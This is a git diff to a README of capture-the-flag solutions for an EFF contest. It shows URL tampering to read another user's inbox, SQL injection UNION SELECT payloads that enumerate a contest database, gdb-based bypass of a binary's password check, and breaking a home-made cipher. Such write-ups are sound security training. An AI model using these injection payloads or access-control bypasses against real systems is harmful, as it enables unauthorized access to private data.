@@ -1,7 +1,11 @@
 # Capture The Flag by EFF
 https://eff-ctf.org
 
+Capture The Flag by EFF is a hacking contest held at the Enigma Conference in San Francisco, CA on Tuesday January 26th 6:30 - 9:30 pm.  The following are my rough solutions to the problem set.  It is possible that the original problems will not be available in the future.  
+
 ### Level 0 The Social Notwork
+
+A vulnerable web application that does not implement technical controls on viewing other users' inbox.  
 
 Your inbox:
 
@@ -10,6 +14,9 @@ https://level0x0.eff-ctf.org/user/M1k3y/message/1
 Replace user with usdhs for:
 
 https://level0x0.eff-ctf.org/user/usdhs/message/1
+
+![](/images/level0.png)
+
 
 ### Level 1 Tweeting Twerps
 
@@ -26,22 +33,24 @@ Doing a union select, there are no errors received with two nulls, this indicate
 https://level0x1.eff-ctf.org/tweets?uid=3 UNION SELECT null, null--
 ```
 
-Testing string concatenation further indicates it's a MySQL DB:
+Testing string concatenation further indicates it's a MySQL DB, so we should be using MySQL syntax:
 ```
 https://level0x1.eff-ctf.org/tweets?uid=3 UNION SELECT null,'test'+'ing'--
 ```
 
-Enumerating:
+Enumerating, we start from the most general data down to more specific data.    
 
-Database:
+Database
 ```
 https://level0x1.eff-ctf.org/tweets?uid=3 UNION SELECT null,database()--
 ```
-Tables:
+
+Tables
 ```
 https://level0x1.eff-ctf.org/tweets?uid=1 UNION SELECT null, table_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
 ```
-Columns:
+
+Columns
 ```
 https://level0x1.eff-ctf.org/tweets?uid=1 UNION SELECT null, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
 ```
@@ -59,7 +68,7 @@ https://level0x1.eff-ctf.org/tweets?uid=1 UNION SELECT null, body FROM messages-
 
 I have not yet figured out what the password is, however I have been able to circumvent the need for an actual password to obtain the flag.
 
-Tools used:  readelf, strings, objdump, gdb
+Tools used:  64-bit linux host (kali/ubuntu) with readelf, strings, objdump, gdb
 
 Obtaining file type:
 
@@ -111,12 +120,14 @@ root@kali:~/re# objdump -D DNSvault
 
 This is where most of the work was performed.  I have annotated the dump with my notes in [DNSvault.asm](./DNSvault.asm)  
 
-Here's a snippet of the key areas.  I have further bolded the important instructions.
+Here's a snippet of the key areas from main().  I have further bolded the important instructions.
 
 <pre>
 ...<i>truncated</i>...
 
-<b>4008a0:	e8 4b fd ff ff       	callq  4005f0 <fgets@plt>         # request input from stdin</b>
+<b>
+  4008a0:	e8 4b fd ff ff       	callq  4005f0 <fgets@plt>         # request input from stdin
+</b>
   4008a5:	c7 85 4c ff ff ff 00 	movl   $0x0,-0xb4(%rbp)           
   4008ac:	00 00 00 
   4008af:	eb 50                	jmp    400901 <main+0x204>        # jumping to a compare...
@@ -251,20 +262,17 @@ Continuing.
 
 </pre>
 
-
 Additional notes:
 
 I have not been able to figure out the password to the code, but I suspect that code from addresses 0x4008b1 to 0x400908 is where the comparison takes place.  If we use gdb to dump the memory register $rbp-0xb4, within the memory blocks we can see the password we have inputed for comparison.  Values in 0x400718 to 0x40081c seem to also allude to a potential password character set (67:,'6b6*'b .#,'6c X+#2 EY? N'2), although could be completely off base.
 
 
-
-
 ### Level 3 Never Roll Your Own Crypto
 
-My first incorrect approach was to build a sort of rainbow table.  Keep a hash table with the key as ascii characters, and values as a massive list of ciphers. Keep making requests until you start to receive duplicates.  In theory, this would work.
+My first incorrect approach was to build a sort of rainbow table.  Keep a hash table with the key as ascii characters, and values as a massive list of ciphers. Keep making requests until you start to receive duplicates.  In theory, this would work but not an ideal solution.
 
 Correct approach:
-Each ascii character produces a random 4 set sized list of integers.  The sum will always be the same.  Create a hashtable  and use the summed value as your key and ascii character as your value.  See level3.py for a rough working solution.
+Each ascii character produces a random 4 set sized list of integers.  The sum will always be the same.  Create a hashtable  and use the summed value as your key and ascii character as your value.  See the python code [level3.py](./level3.py) for a rough but working solution.
 
 ```
 $ python level3.py
